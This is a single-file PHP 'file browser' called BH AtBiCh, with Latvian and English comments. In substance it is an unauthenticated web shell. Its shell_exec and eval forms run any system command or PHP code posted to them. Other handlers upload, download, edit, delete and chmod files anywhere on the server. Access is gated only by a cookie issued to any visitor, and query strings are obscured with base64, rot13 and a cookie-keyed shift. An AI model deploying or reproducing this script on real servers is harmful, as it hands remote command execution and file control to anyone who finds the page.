<?php

die('Aizkomentē šo rindiņu!');

/*

BH AtBiCh

############################################

BlackHalt http://bh.id.lv/ blackhalt@gmail.com

Latviski (LV):
BH AtBiCh
PHP kods, kas nodrošina failu parlūka funkcijas servera iekšienē.
BH AtBiCh ir viens fails un sadalīšana atsevišķos failos nav pieļaujama, jo tad BH AtBiCh zaudē savu jēgu.

English (EN):
BH AtBiCh
BH AtBiCh is yet another file browser written in PHP. 
It is presented as is - use at your own risk. 
The main goal of this browser is to stay lightweight - BH AtBiCh consists from only one file.

############################################
*/

/*

PHP file browser / navigator
As Is
Main Goal = in one file.
For Firefox.

13.12.2005 kaads ir taads ir
21.08.2006 mda
22.09.2006
22.03.2007
04.05.2007
23.05.2007
08-06-2007
07-10-2007
21-05-2008
14-08-2008
06-11-2008
15.09.2010
13.11.2010
17.11.2010
18.07.2012
*/

/*--------------- TODO : ----------------

Notices
Clean code with same functionality
header('Content-Type: archive/zip');

$LANG['blabla'];

--------------- / TODO ----------------*/

function getmicrotime()
{
	list($usec,$sec)=explode(' ',microtime());
	return((float)$usec+(float)$sec);
}
$time_start=getmicrotime();


################ CONFIGURATION START

#error_reporting(0); //public
error_reporting(E_ALL); // test / local server

#ini_set('max_execution_time', 600); // hmz

$versija='⚒ BH AtBiCh 1.0 (Pie Bagātās Kundzes) ⚒';

$cook_name='eeeee'; // Šo varētu ari pamainīt

$key_sec=rand_str();

$shimg=1; // $shimg=1; // if icons, images. // $shimg=0; // if not icons, not images.

$pats=$_SERVER['PHP_SELF'];

################ CONFIGURATION END

#function info($info_what){
#
#}

##################################################

# ENCODE FUNCs START

if(!isset($_COOKIE["$cook_name"]))
{
header("Set-Cookie: ".$cook_name."=".$key_sec."; path=/; expires=".gmstrftime("%A, %d-%b-%Y %H:%M:%S GMT",time()+(3600*24)));
die("<script type=\"text/javascript\">window.location='".$pats."';</script>");
}else
{
$key_sec='qwerty';
}

$key_sec=$_COOKIE["$cook_name"];

function rand_str($length = 32, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890')
{
	$chars_length = (strlen($chars) - 1);
	$string = $chars{rand(0, $chars_length)};
	for ($i = 1; $i < $length; $i = strlen($string)) {
		$r = $chars{rand(0, $chars_length)};
		if ($r != $string{$i - 1})
			$string .= $r;
	}
	return $string;
}

function en_crypt($string){
global $key_sec;
    $result='';
    for($i=0;$i<strlen($string);$i++){
        $char=substr($string,$i,1);
        $key_secchar=substr($key_sec,($i%strlen($key_sec))-1,1);
        $char=chr(ord($char)+ord($key_secchar));
        $result.=$char;
    }
    return str_rot13(base64_encode($result));
}

function de_crypt($string){
global $key_sec;
    $result='';
    $string=base64_decode(str_rot13($string));
    for($i=0;$i<strlen($string);$i++){
        $char=substr($string,$i,1);
        $key_secchar=substr($key_sec,($i%strlen($key_sec))-1,1);
        $char=chr(ord($char)-ord($key_secchar));
        $result.=$char;
    }
    return $result;
}

# ENCODE FUNCs END

##################################################


$deurl=$_SERVER['QUERY_STRING'];

$deurl=de_crypt($deurl);

if (get_magic_quotes_gpc()) {
	function console_stripslashes_array($console_array) {
		return is_array($console_array) ? array_map('console_stripslashes_array', $console_array) : stripslashes($console_array);
	}

	$_COOKIE = console_stripslashes_array($_COOKIE);
	$_FILES = console_stripslashes_array($_FILES);
	$_GET = console_stripslashes_array($_GET);
	$_POST = console_stripslashes_array($_POST);
	$_REQUEST = console_stripslashes_array($_REQUEST);

}

function g($key,$default=false){return isset($_GET[$key])?$_GET[$key]:$default;}
function p($key,$default=false){return isset($_POST[$key])?$_POST[$key]:$default;}
function r($key,$default=false){return isset($_REQUEST[$key])?$_REQUEST[$key]:$default;}

function mapURL($relPath) {
	$filePathName = realpath($relPath);
	$filePath = realpath(dirname($relPath));
	$basePath = realpath($_SERVER['DOCUMENT_ROOT']);
	return 'http://' . $_SERVER['HTTP_HOST'] . substr($filePathName, strlen($basePath));
}

function rm_recursive($filepath)
{
	if (is_dir($filepath) && !is_link($filepath))
	{
		if ($dh = opendir($filepath))
		{
			while (($sf = readdir($dh)) !== false)
			{
				if ($sf == '.' || $sf == '..')
				{
					continue;
				}
				if (!rm_recursive($filepath.'/'.$sf))
				{
					throw new Exception($filepath.'/'.$sf.' nevarēja izdzēst.');
				}
			}
			closedir($dh);
		}
		return rmdir($filepath);
	}
	return unlink($filepath);
}

########################################


$var  = explode('&', $deurl);
  foreach($var as $val)
   {
    $x = explode('=', $val);
    
    if(isset($x[1])){
    $_GET[$x[0]]=urldecode($x[1]);
}
   }


/*
$a = explode('&', $QUERY_STRING);
$i = 0;
while ($i < count($a)) {
    $b = split('=', $a[$i]);
    echo 'Value for parameter ', htmlspecialchars(urldecode($b[0])),
         ' is ', htmlspecialchars(urldecode($b[1])), "<br />\n";
    $i++;
}
*/

#########################################


# ICON images START


if(isset($_GET['icon'])){

	$icon=g('icon');
	
	header('Content-Type: image/png');
	header("Cache-Control: private, max-age=10800, pre-check=10800");
	header("Pragma: private");
	header("Expires: " . date(DATE_RFC822,strtotime("+2 day")));
	#header("HTTP/1.1 304 Not Modified");

	if($icon=='folder'){
		$iconimg='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAALdQTFRF////7MxftoMZ5bhF5cZa3r5TtoMZy58y0aU206g61ao62a483rA+37RB4rVE485r48505bhF9dlz/Omf/std/tZb/uBr/9Zb/95i/95j/99i/99j/+Br/+Bs/+Jr/+Ry/+hw/+h5/+lv/+lw/+yD/+2D/+56/+58//B6//CM//GM//WH//WI//aH//aI//aY//eY//uh//7k//7l//+m//+n//+u//+7///A///V///q///2///5jg6E6wAAAAZ0Uk5TACaZmZmoaiPq7QAAAItJREFUGBkFwUFKxEAUBcD6P40OIsJcQZdz/5uIbjyFChqT7mcVAIDansDXDFDXG7yv7wMYzoWXj0fgc0iIZ/fgra4JAKrGvO2VCkVcXkd+z1pttdVz+8nI2tEpSR0PGTlOZZpd5rZn5Ngn6KS6MnL+NaysznmXkZUJpsnKSPqyVCWdmKkeAOAEAPAPXBhR2i+9eNIAAAAASUVORK5CYII=';
	}

	if($icon=='save'){
		$iconimg='iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAMAAACecocUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAF1QTFRF////ACqjACylADmuAUu6ADKoAEGyAUm4AUy6AVC9AV/HAWPJAWfMBk26CUS0CmnLC23ODU65Ele+FmDDHG3LH3POI3zTJWnGKW7JM3PKQo7ZRoLRWJLXZaPgirnooKf92QAAAAV0Uk5TAH9/f3/Gh5CCAAAATklEQVQIHQXBhwHCMAwAMJmdxtCwAl38fyYSvNZlugHW3zY/AMs29ytgmns7A769ZYHD/fNumcPlGOyfY2bWErArNWsJIMpQAiBOAUCAPyA6A1vVggy1AAAAAElFTkSuQmCC';
	}

	if($icon=='view'){
		$iconimg='iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAAXNSR0IArs4c6QAAAdtJREFUGNM10ctr03AAB/BvkiZpt7g2dmvXJz7QXkTQwQoe5sEddCjqwZse1D9A/BNkuyjiwasnQQ9z0A4FQXspTHFsvip1Wtptfdo1Tfr6pUnTpokX/fwLHwr/PE2sxsSpmZv77e0r+sgQzWGtkt449mpYbbzMvHuiAAADAHcfP7xsTdSSpkAvBcJnZyMR3j3prUY3mwuXJEm4MEW100QuKcxW9nvsV28tOT8X9p8MxjEtBAAqBHkURMflg+RyBgUuOecZBVbpxCftVgtBv/vQBFzsGF7+ADaCINYCWN6B07EXOHGeOveH7FynX38eLrWoOIhRxsAsoNCN4EB3QNaBjsHCKxTBiTzE4+KiQzN7Yo5cxNsyjRCnwKZkdMeHUSIGfNwjuJ11SMoRwCnN0vyYlBTVwIfmDaQa1zAcr6CuriHXA7KdOPKtU4h6fgIDpU7HJo1EN1dAW7Wwp86grHOY5pfRNQjy2h1sVh+gViRQfmvvaY9deR6QM1tkt4x+n0Gjb+Fj8z5UMwS6r8MoKsius2lx5FtnMttpw+c0N+T87hmG9UdB72G/fg90S4K58w2D1LOU8fXH7baqKNT/QfBHBSYyf9WmyCLlCgfsXqViDdQUpC9vYGk6APwFNSjdDm02+7IAAAAASUVORK5CYII=';
	}

	if($icon=='edit'){
		$iconimg='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlz
AAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJwSURB
VDiNfZNLaNNBEIe/3fxjNbRGTXxc6gO1oVaDYGPi26M9ePEg+LgIggdP1hcongRRilW8tAURBRVF
EBURzUERRFCrVui/SWvqozWKSWwI1jaaZMdDNDWGdi4Du+w3v/3NjBIRWs+27BaR1nw+X8M44XQ6
P+VyuU2HDx6xyy5EhJbTJ78nkl/FGCPjRTgclvaOtuyplhPbz2zTWkQQESyAQqFQ7fXMZGT0B4VC
HiOCGFPMYjDG4HJNIbgyVGVfb7s46ZH78hWPo/vXJFml/ypRSv3JGq0USv/JSqO1Zig9xPTcV1zX
7jlX721WtUuCy5jCdevf7yiliMX6SSVTFR4MRp9gIhH8R3fxKfwKBuI4U9JUBtBK4/PVUVe3GGMM
IoIRQ+rDa7JECAYa8cogA+nnfP4cJ7tI7SlXoDV9kV6SiWTpLPsthhm4SygQwPMrQjRq83bBKMP1
O2g+d/m8LlegqK+vZ936taxZuwbf3Gpk8C6hxhV4873Y9hue2F/YcuwxudolAFQoiHbbJBIJsun3
5PtvEgo04i28pavrJZ2xNE377+OtbQDuFIv+70HD0gY2bthAru8awcYVzJJ+Ol928ubjCJuPPMQ9
ZzGgSm8qutDT3cO7rgdMdU9nto7z9OkzeuJZaptaSf/QVHvKu1MB8Pv93Gg/xMKaJJfsD7hmzGPr
8VtMrvFiTHGwxgUA/BzJ0PtukKl+HzsPtOOdv7w0lVobxOiJASBcvf0Cq8o1NgsatDEIGqzi/pQB
LMsazmQy1W63myrXtDFTdbGaA8cYXoRvQykcDmu4BFBK7Tt/oWPCdS6TbVnftVbNAL8BMYgueMPP
RYoAAAAASUVORK5CYII=';
	}
	
	echo base64_decode($iconimg);

	die();

}
# ICON images END



### Lejuplaade/ download START

if(isset($_GET['leja'])&&isset($_GET['c'])){
	
	$aizietleja=$_GET['c'];
	$urll=$_GET['leja'];
	
	$mm_type='application/octet-stream';

	header('Cache-Control: public, must-revalidate');
	header('Content-Type: '.$mm_type);
	//header("Content-Length: " .(string)(filesize($urll)) );
	header('Content-Disposition: attachment; filename="'.$urll.'"');
	header("Content-Transfer-Encoding: binary\n");
	readfile($aizietleja);
	die();
}

### Lejuplaade/ download END

header('content-type: text/html; charset=utf-8');


######## shell_exec START

if(isset($_GET['shell'])){

echo'<p><a href="'.$pats.'" title="back" onClick="history.back()">BACK</a></p>';

?>
<form method="post" action="<?php echo $pats.'?'.en_crypt('shell=1');?>">
<input type="submit" value=" shell_exec GO " />
<input name="code" type="txt" size="130" value="<?php

if(isset($_POST['code'])){

echo htmlspecialchars($_POST['code']);

}
?>" />

<br />

<textarea cols="101" rows="30" name="txt"><?php

if(isset($_POST['code'])){

$no_kill_textarea=shell_exec($_POST['code']);
echo htmlspecialchars($no_kill_textarea);

}

?></textarea>
</form>
<?php
die();
}

######## shell_exec END

######## eval START

if(isset($_GET['eval'])){

echo'<p><a href="'.$pats.'" title="back" onClick="history.back()">BACK</a></p>';

?>
<form method="post" action="<?php echo $pats.'?'.en_crypt('eval=1');?>">
<input type="submit" value=" eval GO " />
<br />
<textarea cols="101" rows="10" name="code"><?php

if(isset($_POST['code'])){

echo htmlspecialchars($_POST['code']);

}
?></textarea>
</form>

<br />

<?php

if(isset($_POST['code'])){

$console_code=$_POST['code'];
$console_hack_code = "?>$console_code";

eval($console_hack_code);

}

?>
<?php
die();
}

######## eval END

# HTML START and never end.

echo<<<GALVA
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>$versija</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta name="author" content="$versija" />
<style type="text/css">
body{background:#FFFFFF;color:#000011;font-family:Verdana,Geneva,Arial,Helvetica,sans-serif;font-size:12px;margin:0;padding:0;}
.a{background:#C2D9C5;color:#000011;}
.b{background:#DBDFDB;color:#000011;}
.c{background:#FFFAFF;color:#000011;}
.d{background:#ECE7EC;color:#000011;}
.kb{padding:1px 2px 1px 2px;}
.nav{background:#888888;color:#000011;padding:1px 10px 1px 10px;}
.balts{background:#FFFFFF;border:none;color:#000011;}
.cels{padding:4px;}
.inl,h1{display:inline;padding:1px 10px 1px 10px;}
.dar{margin:0px 0px 0px 10px;padding:9px 5px 10px 5px;}
em{font-style:normal;}
.forma,.a,.b,.c,.d,.dir,.chmod,.data,.kaste,.apaksa{padding:2px 10px 2px 10px;}
p{margin:0px;padding:2px 0px;}
h1{font-size:medium;}
img{border:0;}
.ic{font-size:24px;margin-right:-4px;}
.warn{background:#FFFFFF;color:red;}
textarea{}
</style>

<script type="text/javascript">

var c='';
var color='#DEDBF0';
function fa(d){
c=d.style.backgroundColor;
d.style.backgroundColor=color;
}
function fb(d){
d.style.backgroundColor=c;
}
</script>

</head><body>
GALVA;

function format_bytes($bsize) {
    $units = array(' B', ' KB', ' MB', ' GB', ' TB');
    for ($bi = 0; $bsize >= 1024 && $bi < 4; $bi++) $bsize /= 1024;
    return round($bsize, 2).$units[$bi];
}

function direktorija($dir,$i,$dziljums){
	global $pats;
	global $lasitdir;
	global $lasitfailus;
	global $shimg;
	$i++;
	if($parbaudadir=opendir($dir)){
		$irdir=0;
		$irfails=0;
		while($file=readdir($parbaudadir)){
			if($file<>'.'&&$file<>'..'){
				if(is_dir($dir.'/'.$file)){
					$lasitdir[$irdir]=$file;
					$irdir++;
				}else{
					$lasitfailus[$irfails]=$file;
					$irfails++;
				}
			}
		}
		if(count($lasitdir)>0){
			sort($lasitdir);
			for($j=0;$j<count($lasitdir);$j++){
				
				
				$saite='<a href="'.$pats.'?'.en_crypt('dir='.$dir.'/'.$lasitdir[$j].'').'">'.$lasitdir[$j].'</a>';
				$saitedzd='<a href="'.$pats.'?'.en_crypt('c='.$dir.'/'.$lasitdir[$j].'&dzeest=yes&dir='.$dir.'').'" onclick="javascript:return confirm(\'Dzēst?\');">X</a>';

				$urlis = mapURL($dir.'/'.$lasitdir[$j]);
				$urlis=str_replace("\\",'/',$urlis);
				
				$imgdir=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[go]');
				
				$skat='<a href="'.$urlis.'/">'.$imgdir.'</a> ';

				$dir_css=($j%2?'a':'b');

				$imgdir1=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=folder').'" alt="" />':'[dir]');

				$druka='<tr class="'.$dir_css.'" onmouseover="fa(this);" onmouseout="fb(this);">
				
				<td>'.$imgdir1.'</td>
				<td>'.$saite.'</td>
				<td></td>
				<td>'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($dir.'/'.$lasitdir[$j])).'</td>
				<td>'.substr(base_convert(fileperms($dir.'/'.$lasitdir[$j]),10,8),2).'</td>
				<td>'.$saitedzd.' '.$skat.'</td>
				
				</tr>
';

				echo $druka;

				if($i<$dziljums){
					direktorija($dir.'/'.$lasitdir[$j],$i,$dziljums);
				}
			}
		}
		#echo'<tr class="nav"> </tr>';
		if(count($lasitfailus)>0){
			sort($lasitfailus);
			for($k=0;$k<count($lasitfailus);$k++){
				
				$saite='<a href="'.$pats.'?'.en_crypt('c='.$dir.'/'.$lasitfailus[$k].'&faili=yes&dir='.$dir.'').'#f">'.$lasitfailus[$k].'</a>';
				
				$saitedz='<a href="'.$pats.'?'.en_crypt('c='.$dir.'/'.$lasitfailus[$k].'&dzeest=yes&dir='.$dir.'').'" onclick="javascript:return confirm(\'Dzēst?\');">X</a>';

				### lejupielaade
				
				$imgdir=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[go]');
				$lej_img=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=save').'" alt="" />':'[save]');
				
				
				$sleja='<a href="'.$pats.'?'.en_crypt('c='.$dir.'/'.$lasitfailus[$k].'&leja='.$lasitfailus[$k].'&dir='.$dir.'').'">'.$lej_img.'</a>';
				###
				$urlis = mapURL($dir);
				$urlis=str_replace("\\",'/',$urlis);
				
				#AAAA
				$filu_css=($k%2?'c':'d');
				$ext=substr(strrchr($dir.'/'.$lasitfailus[$k],'.'),1);
				
				$skat_img=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[view]');
				$moz_icon=($shimg==1 ? '<img src="moz-icon://.'.$ext.'?size=16" alt="'.$ext.'" />':'['.$ext.']');
				
				$skat='<a href="'.$urlis.'/'.$lasitfailus[$k].'">'.$skat_img.'</a> ';
				
				
				$druka='<tr class="'.$filu_css.'" onmouseover="fa(this);" onmouseout="fb(this);">
				
				<td>'.$moz_icon.'</td>
				<td>'.$saite.'</td>
				<td>'.format_bytes(filesize($dir.'/'.$lasitfailus[$k])).'</td>
				<td>'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($dir.'/'.$lasitfailus[$k])).'</td>
				<td>'.substr(base_convert(fileperms($dir.'/'.$lasitfailus[$k]),10,8),3).'</td>
				<td>'.$saitedz.' '.$skat.$sleja.'</td>
				
				</tr>
';

				echo $druka;

			}
		}
		closedir($parbaudadir);
	}
}

if(!isset($_GET['dir'])||$_GET['dir']==''||!is_dir($_GET['dir'])){
	$dir=getcwd();
}else{
	$dir=$_GET['dir'];
}
$dir=str_replace("\\",'/',$dir);

#$urlis = mapURL($dir);
#$urlis=str_replace("\\",'/',$urlis);

$celjsh=pathinfo($dir);
$uzaugshu=$celjsh['dirname'];

if(!isset($_POST['limic'])){
	$limic_val='100000';
}else{
	$limic_val=$_POST['limic'];
}

echo'<div class="kaste">



<!--<a href="./">Adminis</a>-->

<h1 class="inl"><a href="'.$pats.'">'.$versija.'</a></h1>
<p class="inl"><a href="'.$pats.'?'.en_crypt('shell=1').'" title="Execute command via shell and return the complete output as a string">shell_exec</a> <a href="'.$pats.'?'.en_crypt('eval=1').'" title="Evaluate a string as PHP code">PHP eval</a></p>


<!--<p><a href="'.$pats.'">Sākums</a></p>-->

<p>Augstāka direktorija: <a href="'.$pats.'?'.en_crypt('dir='.$uzaugshu.'').'">'.$uzaugshu.'</a></p>
<p>Esošā darba direktorija: <strong><a href="'.$pats.'?'.en_crypt('dir='.$dir.'').'">'.$dir.'</a></strong></p>


<form id="meklis" name="meklis" action="'.$pats.'?'.en_crypt('dir='.$dir.'').'" method="post">
Meklēt datnēs vārdu: 
<input size="30" name="vaig" id="vaig" /> 
datnes izmēra limits(bytes): 
<input size="12" name="limic" id="limic" value="'.$limic_val.'" />
<input type="submit" name="mekmek" value=" Meklēt " />
</form>

<table>
<tr>

<th>ikona</th>
<th>nosaukums</th>
<th>izmērs</th>
<th>datums</th>
<th>chmod</th>
<th>darbības</th>


</tr>

<!--<tr class="nav"> </tr>-->';
if(isset($_POST['vaig'])&&!empty($_POST['vaig'])){
	$k=0;
	foreach(glob("$dir/*.*")as $filename){
		if(isset($_POST['limic'])&&!empty($_POST['limic'])&&filesize($filename)>$_POST['limic']){
			#next($filename);
		}else{
		$findme=$_POST['vaig'];
		$lines=file_get_contents($filename);
		$pos=strpos($lines,$findme);
		if($pos===false){
		}else{
			$filenamex=pathinfo($filename);
			$k++;
			$saite='<a href="'.$pats.'?'.en_crypt('c='.$filename.'&faili=yes&dir='.$dir.'').'#f">'.$filenamex['basename'].'</a>';
			$saitedz='<a href="'.$pats.'?'.en_crypt('c='.$filename.'&dzeest=yes&dir='.$dir.'').'" onclick="javascript:return confirm(\'Dzēst?\');">X</a>';

			### lejupielaade
			
			$img_sleja=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=save').'" alt="" />':'[save]');
			
		
			$sleja='<a href="'.$pats.'?'.en_crypt('c='.$filename.'&leja='.$filenamex['basename'].'&dir='.$dir.'').'">'.$img_sleja.'</a>';
			###

			$urlis = mapURL($dir);
			$urlis=str_replace("\\",'/',$urlis);

			$filu_css=($k%2?'c':'d');
			$ext=substr(strrchr($filename,'.'),1);
			
			$icon_view=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[view]');
			$moz_icon=($shimg==1 ? '<img src="moz-icon://.'.$ext.'?size=16" alt="'.$ext.'" />':'['.$ext.']');
			
			$skat='<a href="'.$urlis.'/'.$filenamex['basename'].'">'.$icon_view.'</a> ';

			$druka='<div class="'.$filu_css.'" onmouseover="fa(this);" onmouseout="fb(this);"> '.$skat.$sleja.' '.$moz_icon.'<em class="dir">'.$saite.'</em><em class="chmod">'.substr(base_convert(fileperms($filename),10,8),3).'</em><em class="kb">'.format_bytes(filesize($filename)).' </em><em class="data">'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($filename)).'</em>  <del title="dzēst!">'.$saitedz.'</del></div>
';
			echo $druka;
		}
		}
	}
}
if(!isset($_POST['vaig'])){
	# cik dzilji rakties izdrukaajot direktoriju sarakstu:
	$dziljums=0;
	direktorija($dir,-1,$dziljums);
}

echo'</table>';

############################################################
#die();

# laboteejamais :
echo'<div class="apaksa"><h3 id="f">Redaktors:</h3><div class="forma">';
if(isset($_GET['ejam'])){
	$dir=$_GET['dir'];
}

#if(!isset($_REQUEST['c'])){
#	$c='';
#	
#}


if(!isset($_GET['c'])){
	$c=p('cx');
}
if(!isset($_POST['c'])){
	$c=g('c');
}
if(isset($_GET['dir'])&&!isset($_GET['c'])){
	$c=$_GET['dir'];
}

#if(!isset($_GET['dir'])||!isset($_GET['c'])){
if(strlen($deurl)<1){

$c=getcwd();

}

	#if(isset($_POST['izvdir'])){
if(p('izvdir')=='yes'){
	$c=p('cx');
}
	#}
if(p('dzdir')=='yes'){
	$c=p('cx');
}
if(p('izvfailu')=='yes'){
	$c=p('cx');
}
if(p('dzfailu')=='yes'){
	$c=p('cx');
}
if(p('chm')=='yes'){
	$c=p('cx');
	$mode_dec=octdec(p('chmn'));
	chmod($c,$mode_dec);
}
if(p('labot')=='yes'){
	$c=p('cx');
	if(p('cx')!=$_GET['c']){
		unset($_POST['tx']);
	}
}
if(p('faili')=='yes'){
	$c=p('cx');
	if(p('cx')!=$_GET['c']){
		unset($f);
	}
}
if((p('cx')!=p('dirx'))&&(p('dzdir')=='yes')){
	$uzaugshu=$dir;
}
if(p('cp')=='yes'){
	$c=p('cx');
	$cop=$_POST['cop'];
	copy($c,''.$_POST['dirx'].'/'.$_POST['cop'].'');
	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$dir")."';</script>");
}
if(p('ren')=='yes'){
	$c=p('cx');
	$renn=$_POST['renn'];
	rename($c,''.$_POST['dirx'].'/'.$_POST['renn'].'');
	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$dir")."';</script>");
}
$tx=p('tx');

$labot=p('labot');
$faili=p('faili');
$izvfailu=p('izvfailu');
$izvdir=p('izvdir');
$dzfailu=p('dzfailu');
$dzeest=g('dzeest');
$dzdir=p('dzdir');

$f=$c;

if(file_exists($f)){

$tiesibas='';

	if(filetype($f)=='file'){

		$tiesibas='Datnes tiesības(chmod) : '.substr(base_convert(fileperms($f),10,8),3);

	}
	if(filetype($f)=='dir'){

		$tiesibas='Direktorijas tiesības(chmod) : '.substr(base_convert(fileperms($f),10,8),2);
		
	}
}

if($izvdir=='yes'){
	
	$oldumask = umask(0);
	mkdir($f,0777);
	umask($oldumask);
	
	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$dir")."';</script>");
}
if($izvfailu=='yes'){
	if(!is_file($f)){
		$nekas='';
		$fp=fopen($f,'w+');
		fwrite($fp,$nekas);
		fclose($fp);
	}
}
if($faili=='yes'){
	$labot=false;
}

if(isset($c)||strlen($deurl)>0){
	if(!file_exists($f)){
		echo'<h1 class="warn">Dzēsts vai nav datnes !</h1>';
	}
}


echo'
<!--
<form id="f" method="get" action="'.$pats.'">
<p>
Iet nešifrēti uz kādu direktoriju(nav ieteicams): <input name="dir" type="text" size="60" value="" />
<input type="submit" name="ejam" value=" Iet " />
</p>
</form>
-->

<form method="post" action="'.$pats.'?'.en_crypt('c='.$c.'&dir='.$dir.'').'">
<input name="dirx" type="hidden" value="'.$dir.'" />

<p>
<strong>Apstrādājamā datne vai direktorija</strong>: <input class="cels" name="cx" type="text" size="60" value="'.$c.'" />
chmod:<input type="radio" name="chm" value="yes" />
<input name="chmn" type="text" size="4" value="0777" />
</p>
<p>
Atzīmēt ko darīt ar apstrādājamo datni vai direktoriju:
</p>
<p>
Skatīt:<strong class="ic">☑</strong><input type="radio" name="faili" value="yes" />
Labot:<strong class="ic">✎</strong><input type="radio" name="labot" value="yes" />
Izveidot datni:<strong class="ic">☻</strong><input type="radio" name="izvfailu" value="yes" />
Dzēst datni:<strong class="ic">☠</strong><input type="radio" name="dzfailu" value="yes" />
Izveidot direktoriju:<strong class="ic">☻</strong><input type="radio" name="izvdir" value="yes" />
Dzēst direktoriju:<strong class="ic">☠</strong><input type="radio" name="dzdir" value="yes" />
<input class="dar" type="submit" name="Submit" value=" Darīt lietas " />
</p>
<p>
Kopēt datni ar jaunu nosaukumu:<strong class="ic">☯</strong><input type="radio" name="cp" value="yes" />
<input name="cop" type="text" size="10" value="" />
Pārdēvēt datni ar jaunu nosaukumu:<strong class="ic">✪</strong><input type="radio" name="ren" value="yes" />
<input name="renn" type="text" size="10" value="" />
</p>';

if(is_file($f)){
	$vajag=file_get_contents($f);
	$jauns=htmlspecialchars($vajag,ENT_QUOTES);

	$ext=substr(strrchr($f,'.'),1);



	if($ext=='php'||$ext=='PHP'){

		echo'<div style="border: solid 1px orange; padding: 10px;">';
		highlight_file($f);
		echo'</div>';

	}

}else{
	$jauns='';
}

$urlis = mapURL($f);
$urlis=str_replace("\\",'/',$urlis);

echo '<p><a href="'.$urlis.'">Skatīt, Darbināt</a></p>';

echo'<p>
<textarea name="tx" cols="101" rows="10">
';

echo $jauns;

echo'</textarea></p></form>';
#upload
if(isset($_POST['su'])&&!empty($_FILES['file'])){
	$liktne=$dir;
	$f_nos='file';
	if(substr($liktne,-1)!='/'){
		$liktne.='/';
	}
	if(!is_dir($liktne)){
		die('<p><strong>'.$liktne.'</strong> nav pareiza direktorija<br /><a href="'.$pats.'?'.en_crypt('dir='.$dir.'').'">Iet atpakalj</a></p>');
	}
	$kurlikt=$liktne.$_FILES['file']['name'];
	$lol=$_FILES['file']['name'];
	if(empty($_FILES['file']['name'])){
		die('<h1>A taa nevar! <a href="'.$pats.'?'.en_crypt('dir='.$dir.'').'">Iet atpakalj</a></h1>');
	}
	if(file_exists($kurlikt)){
		die('<h1>Nevar, jo fails '.$lol.' jau ir! <a href="'.$pats.'?'.en_crypt('dir='.$dir.'').'">Iet atpakalj</a></h1>');
	}
	move_uploaded_file($_FILES['file']['tmp_name'],$kurlikt);
	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$dir")."';</script>");
}
echo'
<h3>Augšuplādēt datni:</h3>
<form id="f2" enctype="multipart/form-data" action="'.$pats.'?'.en_crypt('dir='.$dir.'').'" method="post">
<p>
<input type="file" name="file" /> <input type="submit" name="su" value=" Augšuplādēt " />
</p>
</form>';
#
echo'</div></div>';
if($dzdir=='yes'||$dzeest=='yes'){
	if(!is_file($f)){

		rm_recursive($f);

		//rmdir($f)or die("<script type=\"text/javascript\">alert('Nevaru izdzēst!');</script>");

		if($dzdir=='yes'){
			$uzauga=$uzaugshu;
		}else{
			$uzauga=$dir;
		}
		die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$uzauga")."';</script>");
	}
}
if($dzfailu=='yes'||$dzeest=='yes'){
	if(file_exists($f)){
		unlink($f)or die("<script type=\"text/javascript\">alert('Nevaru izdzēst!');</script>");
		die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("c=$c&dir=$dir")."';</script>");
	}
}
if(isset($tx)&&$labot=='yes'||$izvfailu=='yes'){

	# check own
	#$tx=str_replace('\"','"',$tx);
	#$tx=str_replace("\'","'",$tx);
	#$tx=str_replace('\\\\','\\',$tx);
	#


	if(fopen($f,'w+')==false){
		#fclose($f);
		die("<script type=\"text/javascript\">alert('Nevaru ierakstīt failā!');</script>");
	}
	$fp=fopen($f,'w+');
	fwrite($fp,$tx);
	fclose($fp);
	if($labot=='yes'){
		$kurmest="c=$c&labot=yes&dir=$dir";
	}
	if($izvfailu=='yes'){
		$kurmest="c=$c&faili=yes&dir=$dir";
	}
	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt($kurmest)."#f';</script>");
}
$mstime=number_format(getmicrotime()-$time_start,3,'.',3);
echo'<p><a href="#top">Uz lapas augšu</a> Time to render page: '.$mstime.'</p></div></body></html>';
?>
